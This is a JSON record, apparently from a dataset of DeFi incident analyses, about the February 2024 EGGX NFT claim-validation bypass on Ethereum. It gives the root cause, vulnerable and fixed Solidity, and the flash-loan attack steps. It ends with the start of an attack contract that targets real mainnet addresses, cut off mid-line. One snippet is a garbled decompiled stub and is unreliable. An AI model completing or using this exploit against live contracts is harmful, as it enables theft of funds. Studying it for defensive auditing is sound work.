@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-02-XX_EGGX_NFTClaimMisvalidation",
+ "source_file": "2024/2024-02-XX_EGGX_NFTClaimMisvalidation.md",
+ "title": "EGGX — Flash Loan-Based NFT Claim Validation Bypass Analysis",
+ "date": "2024-02-01",
+ "protocol": "EGGX",
+ "chain": "Ethereum",
+ "loss_raw": "~2 ETH",
+ "loss_usd": null,
+ "root_cause": "`EGGXClaim.check()` does not properly validate NFT ownership or prior claim status, enabling repeated claims against 36 NFT IDs using a temporary balance",
+ "attack_tx": null,
+ "vulnerable_contract": "EGGXClaim 0xFb35DE57",
+ "classes": [
+  "nft"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: check() has no claim validation\ninterface IEGGXClaim {\n    function check(uint256[] calldata tokenIds) external;\n}\n\n// Internal implementation — no ownership or duplicate claim validation\nfunction check(uint256[] calldata tokenIds) external {\n    for (uint i = 0; i < tokenIds.length; i++) {\n        // No check for owner of tokenIds[i]\n        // No check for prior claim\n        _mint(msg.sender, rewardAmount);  // ← anyone can mint\n    }\n}\n\n//",
+  "// File: EGGX_decompiled.sol\ncontract EGGX {\n    function balanceOf(address p0) external view returns (uint256) {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: ownership + duplicate claim validation\nmapping(uint256 => bool) public claimed;\n\nfunction check(uint256[] calldata tokenIds) external {\n    for (uint i = 0; i < tokenIds.length; i++) {\n        uint256 tokenId = tokenIds[i];\n        require(IERC721(nft).ownerOf(tokenId) == msg.sender, \"not owner\");\n        require(!claimed[tokenId], \"already claimed\");\n        claimed[tokenId] = true;\n        _mint(msg.sender, rewardAmount);\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Uniswap V3 flash: borrow entire EGGX pool balance for 0 WETH",
+  "→ [2] Enter uniswapV3FlashCallback()",
+  "→ [3] 6 batches × 6 NFT IDs = 36 check() calls",
+  "→ [4] Repay flash loan (including fee)",
+  "→ [5] Accumulated EGGX → swap for WETH on Uniswap V3",
+  "→ [6] ~2 ETH profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Uniswap V3 flash: borrow entire EGGX pool balance for 0 WETH\n  │\n  ├─→ [2] Enter uniswapV3FlashCallback()\n  │\n  ├─→ [3] 6 batches × 6 NFT IDs = 36 check() calls\n  │         └─ EGGX tokens minted on each call (no ownership validation)\n  │\n  ├─→ [4] Repay flash loan (including fee)\n  │\n  ├─→ [5] Accumulated EGGX → swap for WETH on Uniswap V3\n  │\n  └─→ [6] ~2 ETH profit",
+  "interface IEGGXUNIV3POOL {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256, int256);\n}\n\ninterface IEGGXClaim {\n    function check(uint256[] calldata tokenIds) external;\n}\n\ncontract AttackContract {\n    IEGGXUNIV3POOL constant pool = IEGGXUNIV3POOL(0x26beBB6995a4736F088D129E82620eBA899B944F);\n    IEGGXClaim    constant claim = IEGGXClaim(0xFb35DE57B117FA770761C1A344784075745F84F9);\n    IERC20        constant EGGX  = IERC20(0xe2f95ee8B72fFed59bC4D2F35b1d19b909A6e6b3);\n\n    function testExploit() external {\n        // [1] Flash loan the entire pool EGGX balance for 0 WETH\n        uint256 eg"
+ ]
+}
